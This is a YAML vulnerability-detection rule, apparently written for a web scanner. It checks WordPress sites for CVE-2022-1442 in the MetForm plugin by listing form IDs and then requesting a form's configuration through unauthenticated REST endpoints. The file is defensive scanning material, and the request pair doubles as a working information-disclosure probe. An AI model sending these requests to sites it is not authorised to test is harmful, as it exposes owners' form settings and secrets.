name: yaml-poc-wpmet-metform_elementor_contact_form_builder-other-CVE-2022-1442
binding: f2088a16-d8d4-4907-8c8e-70eccd6178ad
detail:
    author: system_user
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-1442/
        - https://gist.github.com/Xib3rR4dAr/6e6c6e5fa1f8818058c7f03de1eda6bf
        - https://plugins.trac.wordpress.org/changeset/2711944/metform/trunk/core/forms/action.php
        - https://www.wordfence.com/threat-intel/vulnerabilities/id/04a46249-b5b2-4082-b520-cdc4a1370bb1?source=cve
        - https://www.wordfence.com/vulnerability-advisories/#CVE-2022-1442
    vulnerability:
        id: 62930aca-61e6-422c-8d2a-d6efc1d24390
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-json/metform/v1/forms/templates/0
        expression: |
            response.status == 200 && response.body.bstartsWith(bytes("<option value="))
        output:
            search: |
                "<option value=\"(?P<id>([0-9]+))\" >(?P<title>(.*?))</option>".bsubmatch(response.body)
            id: search["id"]
            title: search["title"]
    r1:
        request:
            cache: true
            method: GET
            path: /wp-json/metform/v1/forms/get/{{id}}
        expression: |
            response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(bytes(title)) && "\"success_message\":\"Thank you! Form submitted successfully.\"".bmatches(response.body)
expression: r0() && r1()
